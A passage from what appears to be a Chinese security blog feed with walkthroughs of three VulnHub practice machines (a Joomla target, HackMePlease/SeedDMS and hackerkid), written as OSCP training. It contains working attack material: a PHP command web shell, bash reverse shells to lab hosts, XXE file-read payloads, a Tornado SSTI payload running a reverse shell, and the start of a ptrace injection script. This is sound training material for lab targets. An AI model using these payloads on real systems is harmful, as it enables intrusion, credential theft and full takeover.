title="提权至rob用户"></a>提权至rob用户</h3><p>进入到&#x2F;var&#x2F;www&#x2F;joomla2目录，发现一个配置文件configuration.php</p><p><img src="/posts/3bd3766a/image-20221129223558854.png"></p><p>查看配置文件，发现了数据库的用户名和密码</p><p><img src="/posts/3bd3766a/image-20221129223822633.png"></p><p>尝试用用户名joomla和密码babyjoker登录mysql数据库，登录成功！</p><p><img src="/posts/3bd3766a/image-20221129224128946.png"></p><p>经过一番查找，在数据库batjoke的taskforce表中，发现了rob用户的信息，rob为系统三个用户之一，这个密码可能就是系统rob用户的密码。</p><p><img src="/posts/3bd3766a/image-20221129224454382.png"></p><p>将pswd用base64解密</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/'</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>用户：rob 密码：???AllIHaveAreNegativeThoughts???</strong></p><p>还记得信息收集中，靶机开放了22端口，用获取的用户名密码尝试ssh连接：</p><p><img src="/posts/3bd3766a/image-20221129225218190.png"></p><p>成功以rob用户登录。</p><p>查看rob用户目录下的三个文件，分别是rob用户的user.txt，获取root权限的提示和Abner用户需要帮助。看来离获取root权限还有段距离，下一个要获取的权限是abner用户。</p><p><img src="/posts/3bd3766a/image-20221129225656149.png"></p><h3 id="提权至abner用户"><a href="#提权至abner用户" class="headerlink" title="提权至abner用户"></a>提权至abner用户</h3><p>根据Abnerineedyourhelp文件的内容分析，这一堆字像是打乱了字母顺序的英文单词。考虑为<a href="https://en.wikipedia.org/wiki/ROT13">rot13</a> 类似的加密算法，用<a href="https://gchq.github.io/CyberChef/">CyberChef</a> 进行解密。</p><p><img src="/posts/3bd3766a/image-20221129230856980.png"></p><p>对后面一串密码进行base64解码：</p><p><img src="/posts/3bd3766a/image-20221129231021696.png"></p><p><strong>用户：abner 密码：I33hope99my0death000makes44more8cents00than0my0life0</strong></p><p>利用su切换至abner用户：</p><p><img src="/posts/3bd3766a/image-20221129231627864.png"></p><p>获取到abner用户的user2.txt，然后查看info.txt文件，内容为“格拉斯哥微笑”的介绍，没有下一步提升权限的信息。</p><p><img src="/posts/3bd3766a/image-20221129231934057.png"></p><h3 id="提权至penguin用户"><a href="#提权至penguin用户" class="headerlink" title="提权至penguin用户"></a>提权至penguin用户</h3><p>已知系统有三个用户，现在就剩下penguin用户了。全盘搜索与penguin相关的文件：</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -iname *penguin* 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到了一个隐藏文件.dear_penguins.zip</p><p><img src="/posts/3bd3766a/image-20221129232408727.png"></p><p>把这个文件复制到用户目录进行解压，需要密码为abner用户的密码：I33hope99my0death000makes44more8cents00than0my0life0</p><pre class="line-numbers language-none"><code class="language-none">cp &#x2F;var&#x2F;www&#x2F;joomla2&#x2F;administrator&#x2F;manifests&#x2F;files&#x2F;.dear_penguins.zip ~ &amp;&amp; unzip .dear_penguins.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/3bd3766a/image-20221129232837056.png"></p><p>查看解压后的文件内容：</p><p><img src="/posts/3bd3766a/image-20221129233036701.png"></p><p>最后这串密码用base64解密不成功，原来这是明文&#x3D; &#x3D;</p><p><strong>用户：penguin 密码：scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz</strong></p><p>su切换用户后，获取到user3.txt</p><p><img src="/posts/3bd3766a/image-20221129233856882.png"></p><h3 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h3><p>通过查看penguin的文件，发现.trash_old文件很可疑，它的内容中包含&#x2F;bin&#x2F;sh，而且在root用户组中，而且可以执行。</p><p><img src="/posts/3bd3766a/image-20221129234508764.png"></p><p>利用**<a href="https://github.com/DominicBreuker/pspy">pspy</a>**对系统进程进行监控，以及对用户命令的执行进行枚举。先让靶机从kali上下载工具：</p><p>kali开启HTTP服务在8080端口</p><p><img src="/posts/3bd3766a/image-20221129235439088.png"></p><p>靶机从kali下载pspy</p><p><img src="/posts/3bd3766a/image-20221129235624907.png"></p><p>将pspy赋权限并执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x pspy <span class="token operator">&amp;&amp;</span> ./pspy <span class="token parameter variable">-p</span> <span class="token parameter variable">-i</span> <span class="token number">1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-p：启用输出命令到标准输出（默认启用）<br>-f：启用将文件系统事件打印到STDOUT（默认禁用）<br>-i：两次扫描procfs的时间间隔（单位：毫秒）</p><p>发现.trash_old文件每间隔一分钟就以root用户身份运行一次。</p><p><img src="/posts/3bd3766a/image-20221129235938608.png"></p><p>修改.trash_old，添加以下反弹shell并注释exit 0.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'bash -i >&amp; /dev/tcp/192.168.71.129/4000 0>&amp;1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/3bd3766a/image-20221130000731474.png"></p><p>然后 kali主机监听4000端口，因为.trash_old每1分钟执行一次，所以等待.trash_old被执行时反弹shell回来。</p><p><img src="/posts/3bd3766a/image-20221130001104189.png"></p><p>获取到root权限成功！</p><p><img src="/posts/3bd3766a/image-20221130001225605.png"></p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>该靶机考察了以下知识点：</p><ul><li>cewl生成字典</li><li>利用joomla系统PHP反弹shell</li><li>密码学基础</li><li>全盘搜索敏感文件</li><li>pspy监控进程</li></ul><p>总之以Joomla内容管理系统为切入点，通过爆破进入系统后台，修改网页模板文件获取站点用户shell。接下来是步步深入考察各种提权姿势，利用数据库、密码学、文件搜索等获取各用户账密信息，最后进程监控，在以root权限执行的进程中植入反弹shell代码获取root权限。</p>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackMePlease：从开源项目中获取账密信息</title>
      <link href="/posts/3bf2f4be.html"/>
      <url>/posts/3bf2f4be.html</url>
      
        <content type="html"><![CDATA[<p>靶机下载地址：<a href="https://www.vulnhub.com/entry/hack-me-please-1,731/">https://www.vulnhub.com/entry/hack-me-please-1,731/</a></p><hr><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p><img src="/posts/3bf2f4be/image-20221117095239105.png"></p><p>开放端口信息：</p><ul><li>80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu))</li><li>3306&#x2F;tcp open mysql MySQL 8.0.25-0ubuntu0.20.04.1</li><li>33060&#x2F;tcp open mysqlx?</li></ul><p>测试思路：</p><ul><li>80端口：主要功能点测试、审查源码、JS文件、目录扫描</li><li>3306端口：弱口令爆破，其它途径获取可能的账密信息</li><li>33060端口：mysqlx为mysql的插件，完成文件存储数据库功能</li></ul><h3 id="访问网页"><a href="#访问网页" class="headerlink" title="访问网页"></a>访问网页</h3><p><img src="/posts/3bf2f4be/image-20221116170635838.png"></p><p>查看主要功能点，没有发现切入点。</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="/posts/3bf2f4be/image-20221117090728267.png"></p><p>发现了3个目录，除了index.html外，另外两个一个是一张图片，另一个返回403禁止访问，都没有发现切入点。</p><p><img src="/posts/3bf2f4be/image-20221117091213155.png"></p><p><img src="/posts/3bf2f4be/image-20221117091420629.png"></p><h3 id="审查源码"><a href="#审查源码" class="headerlink" title="审查源码"></a>审查源码</h3><p>返回网页查看源码，其它没什么可疑之处，转而关注js文件，发现了几个感兴趣的js文件</p><p><img src="/posts/3bf2f4be/image-20221117100251759.png"></p><h3 id="JS文件"><a href="#JS文件" class="headerlink" title="JS文件"></a>JS文件</h3><p>查看main.js文件，其中暴露了一个服务目录</p><p><img src="/posts/3bf2f4be/image-20221117100540760.png"></p><p>访问该目录 <a href="http://192.168.71.149/seeddms51x/seeddms-5.1.22/%EF%BC%9A">http://192.168.71.149/seeddms51x/seeddms-5.1.22/：</a></p><p><img src="/posts/3bf2f4be/image-20221117100803453.png"></p><p>发现这是一个文档管理系统，名为SeedDMS，根据目录，版本可能为5.1.22</p><h2 id="2-SeedDMS信息收集"><a href="#2-SeedDMS信息收集" class="headerlink" title="2.SeedDMS信息收集"></a>2.SeedDMS信息收集</h2><p>访问SeedDMS首先要求登录，在面对一个登录页面时，主要有以下思路：</p><ul><li>搜索服务已公开漏洞</li><li>账密爆破</li><li>SQL注入</li><li>如果是开源项目，可以下载到本地查看可用信息，特别是配置文件。必要时需要在本地搭建该项目。</li></ul><p><strong>搜索已公开漏洞</strong>：</p><p><img src="/posts/3bf2f4be/image-20221117101836542.png"></p><p>发现其中没有针对5.1.22版本的，而且看了下，其中的两个可获取shell的RCE漏洞是由于PHP脚本文件上传导致的，是需要登录的，但是现在连登录都没成功，因此这些不可利用。</p><p><strong>账密爆破</strong>：靶机说明里提示了不需要爆破。</p><p><strong>SQL注入</strong>：注意在OSCP考试中是不可以使用sqlmap这类自动化扫描工具的。手工测试方式后续再练习。</p><p><strong>下载开源源码：</strong></p><p>SeedDMS下载地址：<a href="https://sourceforge.net/projects/seeddms/files/">https://sourceforge.net/projects/seeddms/files/</a></p><p>查看配置文件，发现了数据库连接信息，有默认账户名密码。</p><p><img src="/posts/3bf2f4be/image-20221117142937586.png"></p><p>因为把SeedDMS下载到本地，我们知道配置文件的路径为：seeddms主目录&#x2F;conf&#x2F;settings.xml</p><p>这里访问：<a href="http://192.168.71.149/seeddms51x/conf/settings.xml%EF%BC%8C">http://192.168.71.149/seeddms51x/conf/settings.xml，</a></p><p>尝试是否可以查看靶机的配置文件。</p><p><img src="/posts/3bf2f4be/image-20221117143927232.png"></p><p>可以成功读取靶机配置文件，发现数据库账户密码没改，还是seeddms：seeddms</p><h2 id="3-SeedDMS数据库"><a href="#3-SeedDMS数据库" class="headerlink" title="3.SeedDMS数据库"></a>3.SeedDMS数据库</h2><p>用账密信息连接数据库</p><pre class="line-numbers language-none"><code class="language-none">mysql  -h 192.168.71.149  -useeddms -pseeddms -Dseeddms <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/3bf2f4be/image-20221117144624804.png"></p><p>查看seeddms数据库中的表，其中tblUsers这个表中有一个admin用户，密码是被加密了的。</p><p><img src="/posts/3bf2f4be/image-20221117145415092.png"></p><p>把密码用md5解密，解密不成功。</p><p>那么换一种思路，如果把这个表更新，把admin的密码替换为我们已知密码的md5值，是否会成功呢？</p><p>把123456的md5值替换上去。</p><p><img src="/posts/3bf2f4be/image-20221117145919312.png"></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">update tblUsers SET pwd&#x3D;&#39;e10adc3949ba59abbe56e057f20f883e&#39; where login&#x3D;&#39;admin&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新成功。</p><p><img src="/posts/3bf2f4be/image-20221117150417176.png"></p><p>然后尝试登录SeedDMS系统。</p><p><img src="/posts/3bf2f4be/image-20221117150604510.png"></p><p>登录成功！</p><h2 id="4-SeedDMS漏洞利用"><a href="#4-SeedDMS漏洞利用" class="headerlink" title="4.SeedDMS漏洞利用"></a>4.SeedDMS漏洞利用</h2><p>还记得之前搜索公开漏洞时，有两个RCE漏洞是PHP文件上传的，可以尝试一下在该版本中是否可以利用。</p><p><a href="https://www.exploit-db.com/exploits/47022">exploit-db上的漏洞利用</a></p><h3 id="新建后门文档"><a href="#新建后门文档" class="headerlink" title="新建后门文档"></a>新建后门文档</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="上传后门并记住文档号"><a href="#上传后门并记住文档号" class="headerlink" title="上传后门并记住文档号"></a>上传后门并记住文档号</h3><p><img src="/posts/3bf2f4be/image-20221117154722357.png"></p><p>上传完成后刷新下页面，可以看到文件上传成功。</p><p><img src="/posts/3bf2f4be/image-20221117154951403.png"></p><p>系统会把上传的文件放在\seeddms51x\data\1048576\”ID“\1.php(你上传的文件会被重命名为1.php)。查看文档信息，显示文档ID为5。</p><p><img src="/posts/3bf2f4be/image-20221117155435424.png"></p><h3 id="调用后门"><a href="#调用后门" class="headerlink" title="调用后门"></a>调用后门</h3><p>访问<a href="http://192.168.71.149/seeddms51x/data/1048576/5/1.php%EF%BC%8C">http://192.168.71.149/seeddms51x/data/1048576/5/1.php，</a> 调用php后门成功。</p><p><img src="/posts/3bf2f4be/image-20221117161304085.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>反弹shell命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'exec bash -i >&amp; /dev/tcp/192.168.71.139/4444 0>&amp;1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将它进行URI编码后，作为cmd参数内容在hackbar里提交。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bash%20-c%20<span class="token string">'exec%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.71.139%2F4444%200%3E%261'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/3bf2f4be/image-20221117162819807.png"></p><p>成功反弹shell</p><p><img src="/posts/3bf2f4be/image-20221117162858782.png"></p><h2 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h2><p>查看当前权限</p><p><img src="/posts/3bf2f4be/image-20221117164212026.png"></p><h3 id="账号收集"><a href="#账号收集" class="headerlink" title="账号收集"></a>账号收集</h3><p>查看&#x2F;etc&#x2F;passwd文件，发现一个眼熟的用户</p><p><img src="/posts/3bf2f4be/image-20221117164616331.png"></p><p>还记得查看数据表时，user表中有该名称的用户</p><p><img src="/posts/3bf2f4be/image-20221117164721295.png"></p><p>表里显示密码为：Saket@#$1337</p><h3 id="切换账号"><a href="#切换账号" class="headerlink" title="切换账号"></a>切换账号</h3><p>尝试登录saket账号</p><p><img src="/posts/3bf2f4be/image-20221117164956070.png"></p><p>登录成功！</p><h3 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3><p>先用id命令，发现saket用户在很多用户组中；再用sudo -l命令查看该用户权限，发现他可以执行全部sudo命令。</p><p><img src="/posts/3bf2f4be/image-20221117165411336.png"></p><h3 id="转换为root用户"><a href="#转换为root用户" class="headerlink" title="转换为root用户"></a>转换为root用户</h3><p><img src="/posts/3bf2f4be/image-20221117165524553.png"></p><p>获取root权限成功！</p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>该靶机考察的点：</p><ul><li>JS敏感信息泄露：泄露了安装的应用程序目录</li><li>开源项目的信息收集：配置文件中暴露账号密码信息</li><li>mysql基础</li><li>应用服务已知漏洞收集</li><li>后门上传getshell</li><li>反弹shell命令</li><li>linux基础和提权</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackerkid：XXE和SSTI等漏洞利用</title>
      <link href="/posts/a5e7f10c.html"/>
      <url>/posts/a5e7f10c.html</url>
      
        <content type="html"><![CDATA[<p>靶机下载地址：<a href="https://www.vulnhub.com/entry/hacker-kid-101,719/">https://www.vulnhub.com/entry/hacker-kid-101,719/</a></p><hr><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221107105256207.png"></p><p>靶机IP地址为192.168.71.148</p><h3 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3><p><img src="/posts/a5e7f10c/image-20221107105505268.png"></p><h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p><img src="/posts/a5e7f10c/image-20221107105740009.png"></p><p>查看了下源码，发现提示page_no参数，先记录，后面再试。</p><p><img src="/posts/a5e7f10c/image-20221107161410887.png"></p><h4 id="9999端口"><a href="#9999端口" class="headerlink" title="9999端口"></a>9999端口</h4><p><img src="/posts/a5e7f10c/image-20221107105915002.png"></p><p>一个登录页面，查看源码有一个隐藏的输入框，名为_xsrf，值为一串数字。</p><p><img src="/posts/a5e7f10c/image-20221107110119438.png"></p><p>查了资料，发现是网页开启了<strong>XSRF保护</strong>，如果请求不带这个参数值就会被拒绝。在这儿似乎也没有什么可利用的。</p><h3 id="目录探测"><a href="#目录探测" class="headerlink" title="目录探测"></a>目录探测</h3><p><img src="/posts/a5e7f10c/image-20221107115155383.png" alt="9999的目录"></p><p><img src="/posts/a5e7f10c/image-20221107115248698.png" alt="80的目录"></p><p>深度扫描文件，用-X参数指定文件类型</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.71.148 <span class="token parameter variable">-X</span> .html,.php,.txt,.old,.bak,.tar,.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221107162027768.png" alt="目录扫描结果"></p><p>看到了两个可用的html文件，app.html和form.html。</p><p><img src="/posts/a5e7f10c/image-20221107162645446.png" alt="app.html"></p><p><img src="/posts/a5e7f10c/image-20221107162713127.png" alt="form.html"></p><p>两个静态页面啥也没有，所谓的“兔子洞”？</p><h3 id="参数爆破"><a href="#参数爆破" class="headerlink" title="参数爆破"></a>参数爆破</h3><p>回到80端口页面源代码中的提示：试一下page_no参数Get请求，查看网页。</p><p>当page_no&#x3D;1时，页面返回一行红色的字：Oh Man !! Isn’t is right to go a little deep inside? 看来不正确，要找出正确的参数值，用burpsuite进行爆破。</p><p><img src="/posts/a5e7f10c/image-20221107163316258.png"></p><p>用burpsuite（社区版）抓包发送到Intruder模块，爆破page_no参数。</p><p><img src="/posts/a5e7f10c/image-20221107165024425.png"></p><p>设置参数值为1~50</p><p><img src="/posts/a5e7f10c/image-20221107165201487.png"></p><p>发送数据包，查看响应包长度，在参数值为21时，长度不同。</p><p><img src="/posts/a5e7f10c/image-20221107165402414.png"></p><p>该页面提示存在子域名 hackers.blackhat.local</p><p><img src="/posts/a5e7f10c/image-20221107165521411.png"></p><p>在&#x2F;etc&#x2F;hosts中添加一条解析记录</p><p><img src="/posts/a5e7f10c/image-20221107170021487.png"></p><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h2><h3 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h3><p>页面提示表示这个黑客创建了许多子域名，思考利用这些子域名作为突破口。根据给出的域名blackhat.local，检测是否存在 <a href="https://blog.51cto.com/u_15704510/5837377">DNS域传送漏洞</a>，找出其他子域名。</p><p><img src="/posts/a5e7f10c/image-20221111091827118.png" alt="dig工具检测"></p><p>可以看到域名服务器返回了全部记录，存在DNS域传送漏洞。</p><p>发现一个可疑的站点，hackerkid.blackhat.local，把它加入hosts文件，然后访问该域名。</p><p><img src="/posts/a5e7f10c/image-20221111093213878.png"></p><p>查看网页源码，发现XML解析函数，可能存在XEE漏洞。</p><p><img src="/posts/a5e7f10c/image-20221111095550041.png"></p><h3 id="XEE注入攻击"><a href="#XEE注入攻击" class="headerlink" title="XEE注入攻击"></a>XEE注入攻击</h3><p><a href="https://xz.aliyun.com/t/3357">XEE(XML External Entity Injection)</a>漏洞是 OWASP TOP 10 漏洞之一，主要是由于XML解析时允许引用外部实体造成的,也称为XML外部实体注入攻击。</p><p>用burpsuite验证目标是否存在xee漏洞。首先，发现email地址处可以回显，那么可以作为注入处，方便查看返回结果。</p><p><img src="/posts/a5e7f10c/image-20221111113003193.png"></p><p>然后外部实体注入，选择查看&#x2F;etc&#x2F;passwd文件，看漏洞是否存在。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY test SYSTEM 'file:///etc/passwd'></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tel</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tel</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&test;">&amp;test;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111113335209.png"></p><p>看到返回了&#x2F;etc&#x2F;passwd文件内容，存在XEE漏洞！</p><p>尝试读取.bashrc文件，这个文件是用于用户的个性设置的，比如命令别名、环境变量等。在这里我们直接读取是报错的，使用php的base64过滤器进行编码并读取信息。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/home/saket/.bashrc'></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111115125659.png"></p><p>用decode功能将返回的数据进行base64解码</p><p><img src="/posts/a5e7f10c/image-20221111115305033.png"></p><p>发现一个账密信息。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#Setting Password for running python app</span><span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token string">"admin"</span><span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token string">"Saket!#$%@!!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h3><p>信息收集时，有一个9999端口，是登录界面。尝试用这个账密信息登录。</p><p><img src="/posts/a5e7f10c/237025331b42d1ccd2ec30500e8304ef.png"></p><p>发现登录失败。观察这个账密，密码当中有个关键词Saket，在前面读取&#x2F;etc&#x2F;passwd中，saket账户是这个系统中除root外唯一能够有&#x2F;bin&#x2F;bash的权限，于是尝试使用saket进行登录，密码不变，成功登录！</p><p><img src="/posts/a5e7f10c/image-20221111120136294.png"></p><p><img src="/posts/a5e7f10c/image-20221111120159578.png"></p><p>在前面进行信息收集时，我们已经知道9999端口对应的服务是<strong>Tornado</strong>，这是一个Python的Web服务框架，这个框架是可能存在<a href="https://www.cnblogs.com/bmjoker/p/13508538.html"><strong>SSTI模板注入</strong></a>。</p><blockquote><p>服务器端模板注入（SSTI）：漏洞成因是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎（这里特指用于Web开发的模板引擎）在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p></blockquote><p>测试模板注入漏洞：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">$&#123;7*7&#125;,&#123;&#123;7*7&#125;&#125;   &#123;&#123;1+abcxyz&#125;&#125;$&#123;1+abcxyz&#125;&lt;%1+abcxyz%>[abcxyz]   //SSTI通用测试payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第一个payload成功执行，输出了一个49的值，第二个payload是一个模板注入通用payload，页面报错说明存在模板注入漏洞。</p><p><img src="/posts/a5e7f10c/image-20221111161334407.png"></p><p><img src="/posts/a5e7f10c/image-20221111161600301.png"></p><p>既然存在模板注入漏洞，那就可以进行反弹shell的操作，首先在kali上监听端口，并将python反弹shell语句使用<a href="http://tools.jb51.net/static/encodetxt/urlencode_decode/index.html">encodeURIComponent</a>进行编码。</p><pre class="line-numbers language-none"><code class="language-none">编码前：&#123;% import os %&#125;&#123;&#123;os.system(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.71.139&#x2F;4444 0&gt;&amp;1&quot;&#39;)&#125;&#125; 编码后：%7B%25%20import%20os%20%25%7D%7B%7Bos.system(&#39;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.71.139%2F4444%200%3E%261%22&#39;)%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111163815687.png"></p><p>成功获取了交互式shell！</p><h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>当前用户为saket，需要提升到root权限。</p><h4 id="Capabilitie提权"><a href="#Capabilitie提权" class="headerlink" title="Capabilitie提权"></a>Capabilitie提权</h4><p><strong>Capabilities机制</strong>是在Linux内核2.2之后引入的，原理很简单，就是将之前与超级用户root（UID&#x3D;0）关联的特权细分为不同的功能组，Capabilites作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。 这样一来，权限检查的过程就变成了：在执行特权操作时，<strong>如果线程的有效身份不是root，就去检查其是否具有该特权操作所对应的capabilities</strong>，并以此为依据，决定是否可以执行特权操作。 如果Capabilities设置不正确，就会让攻击者有机可乘，实现权限提升。</p><p>使用如下命令发现具有Capabilities特殊操作权限的程序：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/sbin/getcap <span class="token parameter variable">-r</span> / <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token parameter variable">-r</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111171537947.png"></p><p>通过上图发现python具备<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace">cap_sys_ptrace+ep</a>能力，利用它进行提权。这里需要用到一个提权脚本，这个脚本的作用就是对root权限的进程注入python类型shellcode，利用python具备的cap_sys_ptrace+ep 能力实现权限提升，该脚本如果执行成功，会在靶机的本地监听5600端口，我们也可以修改shellcode部分让其监听其他端口。</p><p>在kali上编辑以下代码，上传到靶机上执行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ctypes<span class="token keyword">import</span> sys<span class="token keyword">import</span> struct<span class="token comment"># Macros defined in &lt;sys/ptrace.h></span><span class="token comment"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span>PTRACE_POKETEXT <span class="token operator">=</span> <span class="token number">4</span>PTRACE_GETREGS <span class="token operator">=</span> <span class="token number">12</span>PTRACE_SETREGS <span class="token operator">=</span> <span class="token number">13</span>PTRACE_ATTACH <span class="token 